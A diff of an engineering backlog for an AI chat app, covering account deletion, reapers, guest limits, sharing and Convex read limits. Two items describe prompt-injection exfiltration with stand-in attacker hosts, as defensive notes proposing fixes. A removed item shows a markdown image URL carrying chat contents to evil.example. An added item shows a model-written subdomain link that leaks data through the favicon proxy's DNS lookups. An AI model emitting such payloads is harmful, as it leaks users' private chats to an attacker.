@@ -5,15 +5,19 @@ upload; prevent `saveStagedAttachment` from claiming another attachment's or
 profile image's blob through a caller-supplied storage ID. Share reference-aware
 deletion rules across explicit deletion and staged-attachment cleanup so duplicate
 references cannot delete a blob still in use.
-- **Account deletion must revoke application access:** Enforce `deletedAt` and
-`disabledAt` in the shared Convex auth boundary, including requests with an
-existing valid JWT. Prevent public `users.createOrUpdate` bootstrap calls from
-clearing these flags; reserve account reactivation for verified server lifecycle
-events and preserve the distinction between rejected accounts and guests.
-Also cascade deletion to the user's chats, files, BYOK keys, MCP servers, and
-share links by reusing the ADR-0014 deletion jobs. Also stop the public
-bootstrap from writing `workosUpdatedAt`, email, and avatar from browser input
-([details](docs/audits/2026-09-26-open-source-reference-gaps.md#user-bootstrap-trusts-browser-sent-sync-fields)).
+- **Account deletion webhook gap:** `@convex-dev/workos-authkit` 0.2.9 (the
+latest release) returns early on `user.deleted` for a user missing from its
+mirror, so our account deletion never runs for that user. Keep the mirror
+complete with `workosAuth:backfillUsers` after any reset, run
+`users:deleteAccount` for a missed user (ADR-0044, docs/environment.md), and
+upstream a fix that still calls the app handler.
+- **Reapers can starve behind a blocked Project deletion job:**
+`reapExpiredGenerationRunsPass` and `reapExpiredToolApprovalsPass`
+(`convex/chatRuntime.ts`) read a fixed 25-row window with no cursor and skip
+inactive chats, so the live runs and approvals of a Project whose deletion job
+blocked stay at the head of the range forever. Page them with a
+`reaperCheckpoints` cursor like `reapResolvedApprovalPausesPass`, or close live
+work at the start of Project jobs as ADR-0044 does for account jobs.
 - **Guest abuse and spending limits:** The five-message guest limit resets when
 the client changes its anonymous ID. Add server-enforced network and concurrency
 limits plus an aggregate guest spending ceiling, reusing existing admission
@@ -25,22 +29,13 @@ Prefer a server-signed guest cookie plus an IP bucket, admitted from an
 internal mutation instead of public ones, and fail closed if the limiter store
 is down (Vercel Chatbot's Redis check fails open; do not copy that). Pairs with
 the BotID evaluation below.
-- **Block remote markdown images (data exfiltration):**
-`components/ui/markdown.tsx` has no `img` handler and the CSP allows
-`img-src https:` (`next.config.ts`), so a prompt-injected search or MCP result
-can make the model emit `![](https://evil.example/?d=<chat contents>)` and the
-browser loads it with no click or approval. Render remote images as plain links
-or from an allowlist, tighten `img-src`, and update the `markdown.test.tsx` case
-that asserts images render. No reference project fixes this; the "images are
-inert" reasoning in `next.config.ts` is what needs correcting.
-- **Error boundaries:** No `error.tsx` exists under `app/` and nothing wraps
-message rows in `app/components/chat/conversation.tsx`, so one throw while
-rendering a saved message (for example odd MCP tool output) replaces the whole
-page, and reloading crashes again because the message is persisted. Add a
-segment `error.tsx` with retry and a per-row boundary that falls back to plain
-text or an alert row, keeping the sidebar reachable so the chat can be deleted.
-References: LobeHub `SafeBoundary` per message, LibreChat
-`MarkdownErrorBoundary`.
+- **Favicon proxy sees model-chosen hostnames without a click:** Markdown link
+pills and source chips render `Favicon`, which requests
+`/api/favicon?domain=<host>` on its own, and `app/api/favicon/route.ts` asks
+Google's favicon service about that host. A prompt-injected link to
+`https://<encoded-chat>.evil.example` can leak data through DNS with no click.
+Show favicons only for tool-sourced citations, or a static globe for
+model-written links.
 - **Sharing: revoke and a safe public view:** `makePublic` is the only writer of
 `public: true`, and only chat deletion clears it. Add un-share, and consider a
 separate share id or snapshot instead of exposing the private chat id live.
@@ -51,19 +46,17 @@ from a field allowlist and serve files through a share-scoped path (LibreChat
 `share.ts` is the reference). Changes a contract, so record it in an ADR.
 Also mark share pages `noindex`
 ([details](docs/audits/2026-09-26-open-source-reference-gaps.md#shared-chat-pages-can-be-indexed)).
-- **Convex document and read limits (verify first):** `parts` and `text` are
-both stored per message, and one `prepareGeneration` transaction re-reads the
-whole chat about five to eight times (`convex/chatRuntime.ts`,
-`message_branch_writes.ts`) while `convex/messages.ts` re-reads it on every
-streamed update. Convex caps a document at 1 MiB and a function at 16 MiB of
-reads, and only client-run tool results are capped (100 KB), so a 20-step tool
-turn can overflow a message and lose its tail, and a long branched chat may stop
-accepting messages. First reproduce with a synthetic long chat, including
-whether repeat reads of one document count toward the limit. Then read the chat
-once and pass it down, cap message size on the snapshot and completion writes,
-and consider moving tool payloads to their own rows (LobeHub `message_plugins`,
-Convex agent component per-step rows). Use `messages.by_chat_status` in
-`closeSupersededGenerationsForChat` instead of loading every assistant message.
+- **Convex read ceiling for very large chats:** `prepareGeneration` now reads a
+chat once per turn and each message is capped at 896 KiB (CONTEXT.md "Message
+payload cap"), so sends work up to about 16 MiB of messages (verified to 12 MiB
+on dev). `getSelectedPath` still reads every message, branches included, on
+every content beat per subscriber (ADR-0027 Experiment 2b), a send that
+supersedes a zombie run reads the chat twice (about 8 MiB ceiling), the project
+directory reads each chat's latest 12 messages and can pass 16 MiB with a few
+tool-heavy chats, and user messages over 1 MiB fail at prepare. When real chats
+approach this, move tool payloads to their own rows (LobeHub `message_plugins`,
+Convex agent component per-step rows). `bun scripts/convex-read-limits-smoke.ts
+--target-mib N` measures the ceiling against dev.
 - **Refresh mid-stream can freeze the answer:** `lib/chat-stream/resumable-chat.ts`
 drops replay updates that fail `hasVisiblePrefix` while status is already
 streaming, so Convex checkpoints are not shown either and the UI freezes until
@@ -496,8 +489,9 @@ or whether the exception itself should be removed for consistency. Record the
 decision in ADR-0016.
 - **Simplify message branch bookkeeping:** Every sibling carries `selected` and
 `branchIndex`, legacy parent inference is order-dependent
-(`convex/domain/message_branches.ts`), each write loads, plans, patches,
-reloads, and repairs (`message_branch_writes.ts`), and idempotency scans an
+(`convex/domain/message_branches.ts`), each write plans, patches, and repairs
+over one in-memory copy of the whole chat, read once per mutation
+(`message_branch_writes.ts`), and idempotency scans an
 unindexed `clientMessageId` in JS. ADR-0027 rejects an indexed path because of
 legacy chats, which no longer applies pre-launch. Decide on one
 `activeBranchIndex` pointer on the parent (LobeHub `models/message.ts`) plus a
